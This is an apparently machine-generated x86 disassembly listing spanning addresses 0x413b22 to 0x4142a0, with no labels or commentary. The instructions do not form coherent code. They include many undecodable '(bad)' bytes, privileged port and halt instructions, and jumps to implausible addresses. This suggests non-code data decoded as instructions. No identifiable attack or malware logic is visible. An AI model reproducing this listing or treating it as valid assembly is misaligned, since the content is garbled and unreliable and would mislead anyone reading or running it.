  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
